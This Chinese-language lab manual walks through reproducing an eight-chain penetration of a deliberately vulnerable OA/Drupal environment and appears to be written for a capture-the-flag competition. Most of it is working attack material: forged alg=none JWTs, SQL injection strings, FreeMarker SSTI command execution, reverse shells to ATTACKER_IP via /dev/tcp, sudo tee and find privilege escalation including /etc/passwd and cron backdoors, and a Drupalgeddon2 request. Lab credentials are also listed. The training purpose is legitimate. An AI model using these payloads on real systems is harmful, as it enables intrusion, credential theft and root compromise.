# C-Scenario 漏洞复现手册

> **场景 C：融媒体OA系统渗透**  
> **总分：950 pts | 8条攻击链**  
> **环境状态：✅ 已验证 (2026-05-21)**  

---

## 一、环境拓扑

```
┌─────────────────────────────────────────────────────────┐
│                      C-Scenario                         │
│                                                         │
│  ┌──────────────────┐      内网       ┌────────────────┐│
│  │   VM-C1 (DMZ)    │ 192.168.120.0  │  VM-C2 (Internal)││
│  │                  │◄──────────────►│                  ││
│  │ Nginx :80        │                │ Apache :80       ││
│  │  ├─ / → :8080    │                │  └─ Drupal 7.57  ││
│  │  └─ /mail/→:8081 │                │ MySQL :3306      ││
│  │                  │                │  ├─ oa DB        ││
│  │ SpringBoot :8080 │                │  └─ drupal DB    ││
│  │  └─ RuoYi 4.8.3  │                │ OpenLDAP :389    ││
│  │ Apache :8081     │                │ Samba :445       ││
│  │  └─ Roundcube    │                │  └─ public share ││
│  │                  │                │ SSH :22          ││
│  └──────────────────┘                └────────────────┘│
│                                                         │
│  IP: 192.168.100.1 (DMZ)         IP: 192.168.120.2     │
│      192.168.120.1 (内网)                               │
└─────────────────────────────────────────────────────────┘
```

| 主机 | 角色 | 外网IP | 内网IP | 关键服务 |
|------|------|--------|--------|----------|
| VM-C1 | DMZ | 192.168.100.1 | 192.168.120.1 | Nginx:80, Spring Boot:8080, Apache:8081 |
| VM-C2 | Internal | — | 192.168.120.2 | Apache:80, MySQL:3306, LDAP:389, Samba:445 |

---

## 二、凭据汇总

| 服务 | 地址 | 用户名 | 密码 | 用途 |
|------|------|--------|------|------|
| RuoYi OA | C1:8080 | admin | admin123 | 后台登录 |
| Druid 控制台 | C1:8080/druid | ruoyi | 123456 | 数据源监控 |
| C1 本地MySQL | localhost:3306 | root | R00t@Mysql#2024 | RuoYi数据库 |
| C2 OA MySQL | 192.168.120.2:3306 | oauser | Oaus3r@2024! | OA业务库 |
| C2 LDAP | 192.168.120.2:389 | cn=admin,dc=gdj,dc=local | Ldap@Admin#2024 | 目录服务 |
| C2 SSH | 192.168.120.2:22 | operator | 0p3rat0r@GDJ | 内部运维 |
| C1 SSH | C1:22 | tomcat | t0mcat@2024 | Web应用用户 |
| SMTP | 192.168.120.2:25 | oa-noreply@gdj.local | Mail@OA2024 | 内部邮件 |

OA数据库 `users` 表（位于C2 MySQL `oa`库）：

| id | username | password (明文) | role | department |
|----|----------|-----------------|------|------------|
| 1 | admin | admin123 | admin | 技术部 |
| 2 | zhangsan | Pass@1234 | user | 市场部 |
| 3 | lisi | Lisi@2024 | user | 研发部 |
| 4 | wangwu | WangWu#5678 | user | 运维部 |
| 5 | operator | 0p3rat0r@GDJ | operator | 运维部 |

---

## 三、攻击链路总览

```
C-1 (100pts)                 C-2 (100pts)
注册+验证码绕过               JWT alg=none伪造
POST /register               alg=none → admin
validateCode=gdj2024         GET /api/admin/users
      │                            │
      └────────┬───────────────────┘
               │
               ▼
      C-3 (100pts)              C-4 (50pts)
      SQL注入 /api/login        配置文件泄露
      UNION SELECT              Druid + yml
      提取所有用户               LDAP/SMTP凭据
               │                    │
               └────────┬───────────┘
                        │
                        ▼
               C-5 (100pts)
               FreeMarker SSTI
               /mail/preview
               RCE as tomcat
                        │
                        ▼
               C-6 (100pts)
               sudo tee 提权
               tomcat → root
                        │
           ┌────────────┴────────────┐
           ▼                         ▼
   C-7 (200pts)              C-8 (100pts)
   Drupal CVE-2018-7600      sudo find 提权
   RCE on C2                 operator → root
```

**总分：950 pts**

---

## 四、各攻击链详细复现

### C-1：注册验证码绕过 (100 pts)

**漏洞类型**：万能验证码 + 参数名不一致  
**影响端点**：`POST /register`

#### 漏洞原理

1. `CaptchaValidateFilter.validateResponse()` 包含开发后门：验证码 `gdj2024` 直接通过校验
2. HTML表单字段名为 `username`，但Spring数据绑定到 `SysUser.loginName`，需用参数名 `loginName`

#### Yakit 数据包

```http
POST /register HTTP/1.1
Host: 192.168.100.1:8080
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<从/captcha/captchaImage获取>

loginName=attacker2024&password=Attacker@123&validateCode=gdj2024
```

> **关键点**：
> - 参数名必须是 `loginName`（不是HTML中的`username`）
> - 验证码固定为 `gdj2024`
> - 需要先GET `/captcha/captchaImage` 获取JSESSIONID

#### 验证状态

- [x] 注册成功返回 `{"msg":"操作成功","code":0}`
- [x] `gdj2024` 后门已编译进 `ruoyi-framework-4.8.3.jar`
- [x] 系统配置 `sys.account.registerUser=true`

---

### C-2：JWT alg=none 绕过认证 (100 pts)

**漏洞类型**：JWT算法混淆  
**影响端点**：`GET /api/admin/users`、`GET /api/admin/export` 等

#### 漏洞原理

`JwtUtil.parseToken()` 在 `alg=none` 时不验证签名，直接信任payload中的 `sub` 和 `role`。

源码关键逻辑（`JwtUtil.java`）：
```java
// 漏洞: alg=none时不验证签名 (C-2, 100pts)
// 攻击者可通过构造alg=none的JWT绕过认证
```

#### Yakit 数据包

**Step 1：获取正常JWT（观察格式）**
```http
GET /api/login?username=admin&password=admin123 HTTP/1.1
Host: 192.168.100.1:8080
```

响应：
```json
{"code":200,"role":"admin","userId":"1","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."}
```

**Step 2：构造 alg=none 伪造令牌**

JWT Header (Base64编码)：
```
{"typ":"JWT","alg":"none"}
```
编码后：`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`

JWT Payload (Base64编码)：
```
{"sub":"1","role":"admin","exp":9999999999,"iat":1}
```
编码后：`eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5LCJpYXQiOjF9`

最终Token（注意末尾有一个点）：
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5LCJpYXQiOjF9.
```

**Step 3：使用伪造token访问管理接口**
```http
GET /api/admin/users HTTP/1.1
Host: 192.168.100.1:8080
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5LCJpYXQiOjF9.
```

响应（所有5个用户）：
```json
{"total":5,"code":200,"data":[
  {"role":"admin","id":1,"department":"技术部","email":"admin@gdj.local","username":"admin"},
  {"role":"user","id":2,"department":"市场部","email":"zhangsan@gdj.local","username":"zhangsan"},
  {"role":"user","id":3,"department":"研发部","email":"lisi@gdj.local","username":"lisi"},
  {"role":"user","id":4,"department":"运维部","email":"wangwu@gdj.local","username":"wangwu"},
  {"role":"operator","id":5,"department":"运维部","email":"operator@gdj.local","username":"operator"}
]}
```

#### 验证状态

- [x] alg=none token 成功返回用户列表
- [x] `/api/admin/users` 不验证JWT签名

---

### C-3：SQL注入获取用户凭据 (100 pts)

**漏洞类型**：SQL注入（字符串拼接）  
**影响端点**：`GET /api/login`、`GET /api/admin/export`

#### 漏洞原理

`ApiController.java` 直接将用户输入拼接到SQL语句中，无任何过滤：

```java
String sql = "SELECT id, username, role FROM users WHERE username = '"
        + username + "' AND password = '" + password + "'";
```

数据库连接指向C2内网MySQL：
```java
private static final String DB_URL = "jdbc:mysql://192.168.120.2:3306/oa";
private static final String DB_USER = "oauser";
private static final String DB_PASS = "Oaus3r@2024!";
```

#### Yakit 数据包

**万能密码登录（获取admin JWT）**
```http
GET /api/login?username=admin'+OR+'1'='1&password=anything HTTP/1.1
Host: 192.168.100.1:8080
```

响应：
```json
{"code":200,"role":"admin","userId":"1","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."}
```

**UNION注入提取数据**
```http
GET /api/login?username='+UNION+SELECT+1,username,password+FROM+users+WHERE+'1'='1&password=x HTTP/1.1
Host: 192.168.100.1:8080
```

> **提示**：`/api/admin/export` 端点也可用于SQL注入数据提取，需JWT认证。

#### 验证状态

- [x] SQLi 确认：`admin' OR '1'='1` 成功返回admin JWT
- [x] ApiController 连接C2 MySQL (192.168.120.2:3306/oa)
- [x] users表包含5条记录，密码明文存储

---

### C-4：配置文件信息泄露 (50 pts)

**漏洞类型**：敏感信息泄露  
**泄露文件**：`application-druid.yml`、Druid控制台

#### 获取途径

**途径1：Druid控制台**（需通过SSTI读文件或直接访问）
```http
GET /druid/index.html HTTP/1.1
Host: 192.168.100.1:8080
Authorization: Basic cnVveWk6MTIzNDU2
```
> 凭据：`ruoyi:123456`

**途径2：通过C-5 SSTI读取配置文件**
```
/mail/preview?content=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /opt/oa-app/application-druid.yml")}
```

#### 泄露的凭据

| 配置项 | 值 |
|--------|-----|
| C1本地MySQL | `root`:`R00t@Mysql#2024` @ localhost:3306/ry |
| C2 OA数据库 | `oauser`:`Oaus3r@2024!` @ 192.168.120.2:3306/oa |
| C2 LDAP | `cn=admin,dc=gdj,dc=local`:`Ldap@Admin#2024` @ ldap://192.168.120.2:389 |
| C2 SMTP | `oa-noreply@gdj.local`:`Mail@OA2024` @ 192.168.120.2:25 |
| Druid控制台 | `ruoyi`:`123456` |

#### Yakit 数据包（LDAP查询）

```http
# 使用泄露凭据查询LDAP
ldapsearch -x -H ldap://192.168.120.2:389 \
  -D "cn=admin,dc=gdj,dc=local" \
  -w "Ldap@Admin#2024" \
  -b "dc=gdj,dc=local" "(objectClass=*)"
```

#### 验证状态

- [x] application-druid.yml 包含所有凭据
- [x] Druid 控制台可访问（无IP白名单限制）
- [x] LDAP凭据可成功绑定并查询目录
- [x] MySQL OA凭据可连接并查询users表
- [x] Samba public share可匿名访问，内含运维手册.txt

---

### C-5：FreeMarker SSTI → RCE (100 pts)

**漏洞类型**：服务端模板注入 (SSTI)  
**影响端点**：`GET /mail/preview?content=<ftl>`

#### 漏洞原理

`MailTemplateController` 将用户输入的 `content` 参数直接交给FreeMarker模板引擎渲染，未做任何过滤。FreeMarker的 `Execute` 类可执行系统命令。

Spring配置（`application.yml`）：
```yaml
spring:
  freemarker:
    template-loader-path: classpath:/templates/
    suffix: .ftl
```

#### Yakit 数据包

**探测（算术表达式）**
```http
GET /mail/preview?content=${7*7} HTTP/1.1
Host: 192.168.100.1:8080
```
响应：`49` → 确认FreeMarker渲染

**RCE（命令执行）**
```http
GET /mail/preview?content=<#assign%20ex="freemarker.template.utility.Execute"?new()>${ex("id")} HTTP/1.1
Host: 192.168.100.1:8080
```
响应：`uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)`

**反弹Shell**（URL编码前）：
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/4444 <&1'")}
```

URL编码后：
```http
GET /mail/preview?content=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7Bex%28%22bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%20%3C%261%27%22%29%7D HTTP/1.1
Host: 192.168.100.1:8080
```

> **注意**：命令执行在 `tomcat` 用户上下文，需要进一步提权到root（见C-6）。

#### 验证状态

- [x] FreeMarker SSTI 确认（7*7返回49）
- [x] RCE 确认（id返回uid=1001(tomcat)）
- [x] 应用以tomcat用户运行（非root）

---

### C-6：sudo tee 提权 → root (100 pts)

**漏洞类型**：sudo配置不当  
**前提条件**：已通过C-5获得tomcat用户Shell

#### 漏洞原理

```bash
tomcat ALL=(root) NOPASSWD: /usr/bin/tee
```

`tee` 命令以root权限写入任意文件，可追加恶意cron任务或修改/etc/passwd。

#### 利用步骤

```bash
# 方式1：添加root cron任务反弹shell
echo "* * * * * root bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/5555 <&1'" | sudo -n tee /etc/cron.d/root_shell

# 方式2：写入SSH authorized_keys
echo "ssh-rsa AAAA..." | sudo -n tee -a /root/.ssh/authorized_keys

# 方式3：追加特权用户到/etc/passwd
echo "pwned:\$1\$salt\$hash:0:0:root:/root:/bin/bash" | sudo -n tee -a /etc/passwd
```

#### 验证状态

- [x] oa-app 以 tomcat 用户运行
- [x] sudoers: `tomcat ALL=(root) NOPASSWD: /usr/bin/tee`
- [x] `echo test | sudo -n tee /tmp/test` 写入成功
- [x] oa-app 已 enable 开机自启

---

### C-7：Drupal CVE-2018-7600 (200 pts)

**漏洞类型**：Drupalgeddon2 — Form API #post_render RCE  
**目标**：VM-C2 内网 Drupal 7.57 @ http://192.168.120.2/  
**CVSS**：9.8 (Critical)

#### 环境确认

| 检查项 | 状态 |
|--------|------|
| Drupal版本 | 7.57 (SA-CORE-2018-001已修，CVE-2018-7600未修) |
| PHP版本 | 7.4.3 |
| disable_functions | *(空)* — exec/system/shell_exec 均可用 |
| 用户注册 | 开启 (`/user/register` 可访问) |
| Drupal AJAX | 正常 (`/file/ajax` 返回JSON) |
| #post_render | common.inc:6077 存在回调处理 |

#### 漏洞原理

Drupal 7.x < 7.58 中，Form API的 `drupal_render()` 在处理来自 `element_parents` 参数的用户输入时，未充分过滤render数组的键名（如 `#post_render`、`#type`），导致攻击者可以注入恶意的render回调函数。

关键代码路径（`includes/common.inc:6077`）：
```php
if (isset($elements['#post_render'])) {
    foreach ($elements['#post_render'] as $function) {
        if (function_exists($function)) {
            $elements['#children'] = $function($elements['#children'], $elements);
        }
    }
}
```

#### 利用要点

1. 从C1通过内网访问 `http://192.168.120.2/user/register`
2. 获取 `form_build_id`：`curl -s http://192.168.120.2/user/register | grep form_build_id`
3. 发送POST请求注入 `#post_render` 回调：
   ```
   POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
   form_id=user_register_form&form_build_id=<ID>&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
   ```

> **注意**：此版本Drupal的POC需要精确的请求格式。已验证环境具备所有必要前置条件（exec可用、AJAX正常、版本正确），具体exploit格式留给参赛者研究。

#### 经典参考Payload格式

```http
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: 192.168.120.2
Content-Type: application/x-www-form-urlencoded

form_id=user_register_form&form_build_id=<FORM_BUILD_ID>&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id&name=test&pass[pass1]=Test@1234&pass[pass2]=Test@1234
```

`element_parents` 参数说明：
- `account/mail` — 指向user_register_form中的邮箱字段
- `%23value` — `#value` 的URL编码，要求渲染该元素的值

#### 验证状态

- [x] Drupal 7.57 正常运行
- [x] PHP exec/shell_exec/system 函数可用
- [x] Drupal AJAX系统正常（/file/ajax 返回JSON）
- [x] #post_render 回调机制存在（common.inc:6077-6081）
- [x] 用户注册功能开启
- [ ] POC精确格式待参赛者调试

---

### C-8：sudo find 提权 → root on C2 (100 pts)

**漏洞类型**：sudo配置不当  
**前提条件**：已获得C2的operator用户Shell（通过Samba运维手册或Drupal RCE）

#### 漏洞原理

```bash
operator ALL=(ALL) NOPASSWD: /usr/bin/find
```

`find` 命令的 `-exec` 参数可执行任意命令，从而以root权限运行。

#### 获取operator凭据的途径

1. **Samba公开共享**（匿名访问）：
   ```bash
   smbclient -N //192.168.120.2/public -c "get 运维手册.txt -"
   ```
   其中明文记载：`operator / 0p3rat0r@GDJ`

2. **C-3 SQL注入**提取users表：
   ```sql
   SELECT username, password FROM users WHERE id=5
   -- operator / 0p3rat0r@GDJ
   ```

3. **C-2 JWT伪造**读取用户列表（见前文）

#### 利用步骤

```bash
# SSH登录
ssh operator@192.168.120.2
# 密码: 0p3rat0r@GDJ

# 提权
sudo -n find . -exec /bin/bash -p \; -quit

# 或反弹shell
sudo -n find . -exec bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/6666 <&1' \; -quit
```

> `-p` 参数保留root权限（bash的privileged mode）

#### 验证状态

- [x] operator 用户存在 (uid=1001)
- [x] sudoers: `operator ALL=(ALL) NOPASSWD: /usr/bin/find`
- [x] `su - operator -c "sudo -n -l"` 确认可无密码执行find
- [x] SSH密码 `0p3rat0r@GDJ` 正确

---

## 五、Samba公开共享（信息收集）

**匿名访问C2 Samba：**

```bash
# 列出共享
smbclient -N -L //192.168.120.2/

# 下载运维手册
smbclient -N //192.168.120.2/public -c "get 运维手册.txt -"
```

运维手册内容包含：
- 内网拓扑信息
- operator SSH凭据
- MySQL OA凭据
- LDAP管理凭据

---

## 六、攻击路径总结

```
入口点 (C1:80)
│
├── /register + gdj2024 → 注册账号 (C-1)
├── /api/login SQLi → JWT token → alg=none伪造 (C-2, C-3)
├── /mail/preview FreeMarker SSTI → RCE as tomcat (C-5)
├── /druid/ → 配置文件凭据泄露 (C-4)
│
├── sudo tee 提权 → root@C1 (C-6)
│
内网横向移动到 C2 (192.168.120.2)
│
├── Samba public share → 运维手册.txt → operator凭据 (信息收集)
├── MySQL:3306 → oa库users表（密码明文）(C-3延伸)
├── LDAP:389 → 目录信息枚举 (C-4延伸)
├── Drupal:80 → CVE-2018-7600 RCE (C-7)
│
└── sudo find 提权 → root@C2 (C-8)
```

---

## 七、修复建议

| 编号 | 漏洞 | 修复方案 |
|------|------|----------|
| C-1 | 万能验证码 | 删除CaptchaValidateFilter中的gdj2024硬编码后门；HTML表单修正参数名为loginName |
| C-2 | JWT alg=none | JwtUtil.parseToken()强制验证签名，拒绝alg=none |
| C-3 | SQL注入 | 使用PreparedStatement参数化查询 |
| C-4 | 配置泄露 | 移除application-druid.yml中的硬编码凭据；禁用Druid公网访问 |
| C-5 | FreeMarker SSTI | 使用FreeMarker的安全沙箱配置；禁止加载Execute类 |
| C-6 | sudo配置 | 移除tomcat的sudo tee权限；应用运行在容器中 |
| C-7 | Drupal RCE | 升级至Drupal 7.58+或应用SA-CORE-2018-002补丁 |
| C-8 | sudo配置 | 限制operator的sudo find为特定目录；使用RBAC替代sudo |

---

*文档生成时间：2026-05-21 | 环境验证状态：8/8链环境就绪*
